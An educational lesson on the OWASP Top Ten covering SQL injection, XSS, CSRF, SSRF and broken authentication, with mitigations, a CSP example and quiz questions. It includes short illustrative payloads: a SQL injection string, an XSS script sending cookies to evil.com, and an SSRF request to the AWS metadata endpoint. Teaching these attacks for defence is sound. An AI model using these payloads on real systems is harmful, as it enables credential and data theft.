title: OWASP Top Ten
tagline: The most critical web application security risks: SQL injection, XSS, CSRF, broken authentication, SSRF, and their mitigations — with exploits and defenses in code.

sections.content:
The **OWASP Top Ten** is an industry-consensus list of the most critical web application security risks, updated periodically based on real-world breach data. It represents the minimum security baseline every web developer should understand. These vulnerabilities are not exotic — they appear routinely in code reviews, bug bounties, and breach reports, often because developers are unaware of the attack pattern or trust user input without validation.

The 2021 OWASP Top Ten includes: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection (SQLi/NoSQLi/LDAP), A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable & Outdated Components, A07 Identification & Authentication Failures, A08 Software & Data Integrity Failures, A09 Security Logging & Monitoring Failures, A10 Server-Side Request Forgery (SSRF). This topic focuses on the most commonly exploited: **Injection, XSS, CSRF, Broken Authentication, and SSRF**.

sections.caption: Injection vulnerabilities share a root cause: unsanitized user input mixed with code/commands. The fix is always the same: separate data from code.

sections.title: The Trusted Stranger and the Forged Letter
sections.content:
**SQL Injection** is like a new employee who fills out a form asking for their name and writes: *'Robert'); DROP TABLE employees; --'*. If the office manager reads the form aloud as a command rather than as data, catastrophe follows. The fix: always treat form input as data, never as commands — use parameterized queries, not string concatenation.

**XSS (Cross-Site Scripting)** is like a bulletin board in a school where students can post notes. A malicious student posts a note that says: 'To read this, press here' — but 'here' secretly calls home and steals your phone. The bulletin board failed to treat the note as plain text; instead it let the note contain executable instructions. Output encoding is the fix: display content as text, not as active code.

**CSRF (Cross-Site Request Forgery)** is a forged letter bearing your signature. A bank's website trusts requests with your session cookie. A malicious page causes your browser to silently submit a transfer form — your browser helpfully sends your cookies along. The bank sees a request 'signed' with your credentials and executes it. CSRF tokens and `SameSite` cookies ensure only pages from your origin can trigger state-changing requests.

**SQL Injection (A03)** occurs when user-supplied data is concatenated directly into SQL queries. `SELECT * FROM users WHERE email = '` + userInput + `'` — input `' OR '1'='1` turns this into `WHERE email = '' OR '1'='1'`, returning all users. Worse inputs can exfiltrate the entire database, bypass authentication, or (with `xp_cmdshell`) execute OS commands. **Mitigation**: always use **parameterized queries** (prepared statements) or an ORM that uses them under the hood. Never build SQL strings by concatenation. Apply principle of least privilege on database accounts — the app account should not have `DROP TABLE` permission.

**XSS (A03)** — Cross-Site Scripting — injects malicious scripts into web pages viewed by other users. **Reflected XSS**: malicious input from a URL is immediately included in the response (`<script>fetch('evil.com?c='+document.cookie)</script>`). **Stored XSS**: the payload is saved in the database and served to every user who views it (comment sections, profile fields). **DOM-based XSS**: client-side JavaScript reads attacker-controlled data and writes it to the DOM unsafely. **Mitigations**: (1) HTML-encode all output (`<`, `>`, `&`). (2) Use Content Security Policy (CSP) to whitelist allowed script sources. (3) Set `HttpOnly` on session cookies so XSS cannot steal them. (4) Use framework auto-escaping (React JSX, Angular templates do this by default).

**CSRF (A01-adjacent)** — Cross-Site Request Forgery — tricks an authenticated user's browser into making requests to your site. If `https://bank.com/transfer` accepts a POST with just session cookies, an attacker's page can post a hidden form to it — the browser sends the session cookie automatically. **Mitigations**: (1) **CSRF tokens**: a unique, unpredictable value per session, included in forms and verified server-side. (2) **`SameSite=Strict` cookies**: the browser only sends cookies when navigating from the same site — cross-site requests don't include them. (3) Check the `Origin`/`Referer` headers for state-changing requests.

**SSRF (A10)** — Server-Side Request Forgery — tricks the server into making HTTP requests to internal resources. If your app accepts a URL parameter and fetches it server-side (`fetch(req.query.url)`), an attacker can pass `http://169.254.169.254/latest/meta-data/` to read AWS EC2 instance metadata (including IAM credentials), scan internal networks, or access services behind the firewall. **Mitigations**: (1) Validate and allowlist target URLs/domains. (2) Resolve the DNS before allowing the request and block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x). (3) Use an egress proxy that only allows pre-approved external domains.

**Broken Authentication (A07)** covers weak passwords, credential stuffing (using breached password lists), missing MFA, and insecure 'remember me' tokens. **Mitigations**: rate-limit login attempts, enforce MFA, use breach password databases (HaveIBeenPwned API), implement account lockout, and set short session timeouts.

sections.caption: CSRF attack: the attacker's page causes the victim's browser to submit a state-changing request to the target site, which trusts the automatically-included session cookie.

sections.label: Runtime
sections.explanation: Key defensive patterns: (1) Parameterized queries are non-negotiable for any database interaction. (2) `textContent` (not `innerHTML`) is safe for inserting user content into the DOM — it always treats the value as text. (3) CSRF tokens must be unpredictable, stored in session (not cookies), and compared with `timingSafeEqual`. (4) SSRF mitigation requires both a domain allowlist AND post-DNS-resolution IP blocking — attackers can control DNS to return internal IPs after an allowlist check (DNS rebinding).

sections.label: Concept
sections.code:
// ── OWASP Top Ten 2021 quick reference ───────────────────────
const OWASP_TOP_TEN = [
  { rank: 'A01', name: 'Broken Access Control',          example: 'User accesses admin panel by changing URL parameter', fix: 'Enforce authz on every endpoint; check resource ownership' },
  { rank: 'A02', name: 'Cryptographic Failures',         example: 'Passwords stored as MD5; HTTP used for login page', fix: 'HTTPS everywhere; Argon2id for passwords; AES-256 for data at rest' },
  { rank: 'A03', name: 'Injection',                      example: 'SQL injection via unsanitized input; XSS via innerHTML', fix: 'Parameterized queries; output encoding; CSP' },
  { rank: 'A04', name: 'Insecure Design',                example: 'No rate limiting; business logic flaws in checkout', fix: 'Threat model during design; security requirements' },
  { rank: 'A05', name: 'Security Misconfiguration',      example: 'Default admin passwords; S3 bucket public; stack traces exposed', fix: 'Harden configs; disable defaults; automated scanning' },
  { rank: 'A06', name: 'Vulnerable & Outdated Components', example: 'Log4Shell via old log4j dependency', fix: 'SCA tools (Snyk, Dependabot); keep deps updated' },
  { rank: 'A07', name: 'Auth & Session Failures',        example: 'Weak passwords; no MFA; session not invalidated on logout', fix: 'Strong sessions; MFA; rate limiting; breach password checks' },
  { rank: 'A08', name: 'Software & Data Integrity',      example: 'npm package hijacking; unsigned CI/CD artifacts', fix: 'Verify checksums; sign artifacts; lock dependencies' },
  { rank: 'A09', name: 'Security Logging & Monitoring',  example: 'Breach undetected for months; no alerts on auth failures', fix: 'Log auth events; alert on anomalies; SIEM integration' },
  { rank: 'A10', name: 'SSRF',                           example: 'Fetch arbitrary URL → access internal metadata service', fix: 'Allowlist external domains; block private IPs after DNS resolution' },
];

// ── Content Security Policy (CSP) — XSS defense in depth ─────
const CSP_HEADER = [
  "default-src 'self'",                    // Only load from same origin by default
  "script-src 'self' 'nonce-RANDOM_NONCE'",// Allow scripts only from origin + nonce-tagged inline
  "style-src 'self' fonts.googleapis.com",
  "img-src 'self' data: https:",
  "connect-src 'self' api.example.com",
  "font-src 'self' fonts.gstatic.com",
  "frame-ancestors 'none'",                // Prevent clickjacking
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');
// Set as: Content-Security-Policy: <above value>

sections.content: **Practical security posture for every project**: (1) Use parameterized queries everywhere — no exceptions. (2) Set security headers (`CSP`, `HSTS`, `X-Content-Type-Options`, `X-Frame-Options`) via middleware. (3) Integrate a Software Composition Analysis (SCA) tool like Snyk or GitHub Dependabot to catch vulnerable dependencies automatically. (4) Log all authentication events (success, failure, logout) and set up alerts for anomaly patterns (many failed logins, new country login). (5) Run OWASP ZAP or Burp Suite against your staging environment before every release.

items: **SQL Injection** is prevented by parameterized queries — never concatenate user input into SQL strings. If you use raw SQL strings anywhere in your codebase, assume it is vulnerable until proven otherwise.

**XSS** is prevented by treating all user input as data, not code: use `textContent` not `innerHTML`, enable framework auto-escaping, and deploy a Content Security Policy to limit damage from any escapes.
**CSRF** attacks exploit browser cookie-sending behavior. Mitigate with CSRF tokens in forms (verified server-side) and `SameSite=Strict` cookies that browsers won't send on cross-site requests.

**SSRF** lets attackers use your server as a proxy to reach internal services. Block private IP ranges *after* DNS resolution (to prevent DNS rebinding), and allowlist only permitted external domains.

**Broken Access Control** (OWASP #1) is the most widespread risk: always check authorization on every endpoint and verify resource ownership (IDOR protection), not just that the user is authenticated.

quiz.question: What is the root cause of SQL injection vulnerabilities?
options: Using an outdated version of the database engine
User-supplied input being concatenated directly into SQL query strings
Missing database connection encryption
Not using stored procedures for all database operations
quiz.explanation: SQL injection occurs when user-supplied data is treated as SQL code by being concatenated directly into query strings. The database parser cannot distinguish between intended SQL structure and injected code. Parameterized queries (prepared statements) fix this by sending the query template and data separately — the database driver ensures data is always treated as a value, never as code.

quiz.question: What is the difference between reflected XSS and stored XSS?
options: Reflected XSS runs in Node.js; stored XSS runs in the browser
Reflected XSS payloads are returned immediately in the same response; stored XSS payloads are saved in a database and served to multiple victims later
Reflected XSS requires the victim to be authenticated; stored XSS works on public pages
Stored XSS only affects Internet Explorer; reflected XSS affects all browsers
quiz.explanation: Reflected XSS: the payload comes from the request (e.g., a URL parameter) and is immediately reflected in the response — typically requires tricking the victim into clicking a crafted URL. Stored (persistent) XSS: the payload is saved to the database (e.g., a comment, username, profile bio) and served to every user who views that content, making it far more dangerous and requiring no victim interaction beyond visiting the page.

quiz.question: Why does setting SameSite=Strict on cookies help prevent CSRF attacks?
options: It encrypts the cookie so attackers cannot forge its value
It prevents the browser from sending the cookie in requests originating from other sites
It limits the cookie to HTTPS connections only
It requires the browser to verify the origin header before sending any request
quiz.explanation: SameSite=Strict tells browsers to only send the cookie when the request originates from the same site (same registrable domain). Cross-site requests — like those triggered by a malicious page's form submission — will not include SameSite=Strict cookies, so the server sees no session credentials and rejects the request. This makes CSRF attacks ineffective even without explicit CSRF tokens, though using both is recommended.

quiz.question: What is a Server-Side Request Forgery (SSRF) attack?
options: An attacker forging HTTP responses from the server to redirect users to malicious sites
An attacker causing the server to make HTTP requests to internal or unintended external resources
Forging a server's TLS certificate to intercept HTTPS traffic
Submitting requests with forged server-side session tokens
quiz.explanation: SSRF exploits server-side URL fetching functionality. If an application fetches a URL provided by the user without validation, attackers can cause the server to request internal services (metadata APIs, databases, admin panels) that are not accessible from the internet. Famous examples include the 2019 Capital One breach where SSRF was used to access AWS EC2 instance metadata and steal IAM credentials.

quiz.question: Why is blocking private IP ranges after DNS resolution important for SSRF mitigation?
options: DNS resolution is slow, so checking after is more efficient
Attackers can control DNS to initially return a public IP (passing allowlist checks), then quickly change it to an internal IP (DNS rebinding attack)
Private IP validation only works after TCP connection establishment
SSRF attacks always use domain names, never IP addresses directly
quiz.explanation: DNS rebinding allows an attacker to own a domain, initially make it resolve to a public IP (passing domain/IP validation checks), then change the DNS TTL to a very low value and update the record to point to an internal IP (e.g., 169.254.169.254). If the server validates the hostname but re-resolves DNS when making the actual request, the second resolution returns the internal IP. Resolving DNS once and checking that resolved IP is the fix.

quiz.question: What does a Content Security Policy (CSP) header accomplish?
options: It encrypts all content served by the server
It tells browsers which sources are allowed to load scripts, styles, images, and other resources — restricting what injected XSS scripts can do
It prevents SQL injection by sanitizing all content before storage
It enforces HTTPS by redirecting all HTTP requests
quiz.explanation: CSP is a browser security mechanism delivered via HTTP header. It specifies which sources are trusted for scripts, styles, images, etc. A strict CSP like `script-src 'self' 'nonce-X'` blocks inline scripts without the matching nonce and scripts from external origins. Even if an attacker injects malicious script content, the browser refuses to execute it if the CSP doesn't allow it. CSP is defense-in-depth — it reduces damage from XSS but doesn't eliminate the vulnerability.

quiz.question: What OWASP category covers the Log4Shell vulnerability (CVE-2021-44228)?
options: A03: Injection
A05: Security Misconfiguration
A06: Vulnerable and Outdated Components
A08: Software and Data Integrity Failures
quiz.explanation: Log4Shell was a critical vulnerability in the Apache Log4j library (a widely-used Java logging framework). Organizations running applications with an outdated, unpatched version of Log4j were vulnerable. This falls squarely under A06: Vulnerable and Outdated Components. Mitigation involves keeping dependencies updated and using SCA (Software Composition Analysis) tools like Snyk or Dependabot to detect known vulnerabilities in your dependency tree.

quiz.question: What is a CSRF token and where should it be stored?
options: A signed JWT stored in localStorage and sent in the Authorization header
An unpredictable value stored in the user's server-side session and included in forms, verified server-side on state-changing requests
A hash of the user's password stored in a cookie
A timestamp embedded in every form that expires after 60 seconds
quiz.explanation: A CSRF token is a cryptographically random, unpredictable value (e.g., 256-bit) associated with the user's session on the server. It is included in HTML forms or request headers and verified server-side on every state-changing request (POST, PUT, DELETE). Since an attacker's page on a different origin cannot read the CSRF token from the target site (same-origin policy), they cannot include a valid token in forged requests.

quiz.question: What is 'Broken Access Control' (OWASP A01) and how does it differ from authentication failures?
options: Broken access control means users can access the system without logging in; auth failures mean the login form is broken
Authentication failures prevent users from logging in; broken access control allows authenticated users to access resources or perform actions they should not be permitted to
Broken access control refers to CORS misconfigurations; auth failures refer to expired sessions
They are the same thing — both result in unauthorized access
quiz.explanation: Authentication verifies identity (who you are); access control enforces what you can do after authentication. Broken access control (OWASP #1, the most common risk) means authenticated users can access other users' data (IDOR), perform privileged actions, or access admin functionality by simply changing a URL parameter or request. Common examples: changing `/users/123/profile` to `/users/124/profile` and viewing someone else's data.

quiz.question: Which of the following is the most effective primary defense against XSS in a React application?
options: Manually HTML-encoding all strings before passing them to components
React's JSX syntax, which auto-escapes dynamic values inserted into JSX templates
Setting X-XSS-Protection: 1; mode=block HTTP header
Using dangerouslySetInnerHTML for all dynamic content
quiz.explanation: React's JSX automatically HTML-escapes any expressions rendered as text (`{userContent}`), making them safe by default. This is why React applications are generally resistant to XSS when following normal patterns. The main XSS vector in React is explicitly bypassing this via `dangerouslySetInnerHTML` — which, as its name suggests, should almost never be used with user-controlled content. The `X-XSS-Protection` header is deprecated and removed from modern browsers.
